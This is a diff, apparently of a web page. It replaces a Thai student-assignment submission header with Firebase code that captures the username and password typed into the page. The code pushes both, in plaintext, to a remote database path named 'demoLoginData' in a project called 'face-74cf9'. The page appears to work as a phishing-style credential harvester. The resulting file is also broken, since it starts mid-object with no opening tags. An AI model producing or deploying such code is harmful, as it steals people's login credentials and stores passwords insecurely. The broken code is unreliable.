@@ -1,11 +1,36 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>เว็บไซต์ส่งงานนักศึกษา</title>
-  <meta charset="UTF-8">
-</head>
-<body>
-  <h1>ยินดีต้อนรับ</h1>
-  <p>หน้านี้ใช้สำหรับส่งงานนักศึกษา</p>
+storageBucket: "face-74cf9.appspot.com",
+  messagingSenderId: "557691629577",
+  appId: "1:557691629577:web:81a26d33a694bc95c488d8"
+};
+
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
+
+window.saveData = function() {
+
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  if(username === "" || password === ""){
+    alert("กรุณากรอกข้อมูลให้ครบ");
+    return;
+  }
+
+  push(ref(database, "demoLoginData"), {
+    username: username,
+    password: password,
+    timestamp: new Date().toLocaleString()
+  })
+  .then(() => {
+    alert("บันทึกข้อมูลเรียบร้อย");
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+  })
+  .catch((error) => {
+    alert("Error: " + error);
+  });
+}
+</script>
+
 </body>
 </html>
